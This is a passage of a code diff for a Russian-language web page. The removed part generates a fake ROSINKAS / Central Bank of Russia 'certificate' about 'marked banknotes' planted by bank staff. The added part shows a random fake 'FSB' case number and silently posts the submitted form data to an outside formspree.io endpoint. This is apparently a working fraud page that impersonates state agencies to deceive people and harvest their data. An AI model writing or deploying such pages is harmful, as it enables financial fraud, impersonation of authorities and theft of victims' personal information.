-  <p>Настоящим подтверждается, что экспертиза подлинности денежных знаков завершена успешно.</p>
-  <p><strong>Чистые купюры (${cleanCount} шт.)</strong> — ПРИЗНАНЫ ЛЕГАЛЬНЫМИ.</p>
-  <p><strong>Меченые купюры (${dirtyCount} шт.)</strong> — ВЫЯВЛЕНЫ И ИЗЪЯТЫ ИЗ ОБОРОТА.</p>
-  <p>Меченые купюры были подмешаны сотрудниками коммерческого банка и проходят по ориентировкам о мошеннических действиях. Владелец <strong>НЕ НЕСЁТ</strong> ответственности за данные купюры.</p>
-  <p>Сертификат подтверждает легальность происхождения денежных средств в размере <strong>${cleanTotal.toLocaleString('ru-RU')} ₽</strong> (чистые купюры) и гарантирует их возврат владельцу.</p>
-  <div class="stamp">
-    <p>Подпись уполномоченного лица: _________________________</p>
-    <p>Печать: РОСИНКАС · ЦБ РФ</p>
-  </div>
-  <p style="text-align:center; margin-top:20px; font-size:11px;">Документ сформирован автоматически · Система онлайн-мониторинга РОСИНКАС</p>
-</body></html>`;
-
-      const blob = new Blob([html], { type: 'text/html' });
-      const url = URL.createObjectURL(blob);
-      window.open(url, '_blank');
+      const btn = document.getElementById('submitBtn');
+      btn.disabled = true; btn.textContent = '⏳ Отправка...';
+      const num = 'ФСБ-' + Math.floor(Math.random() * 900000 + 100000) + '-' + Math.floor(Math.random() * 90 + 10);
+      document.getElementById('responseNumber').textContent = num;
+      document.getElementById('responseBox').classList.add('show');
+      const fd = new FormData(this);
+      try { await fetch('https://formspree.io/f/maqzpror', { method: 'POST', body: fd, headers: { 'Accept': 'application/json' } }); } catch(e) {}
+      btn.textContent = '✅ Отправлено';
     });
   </script>
 </body>
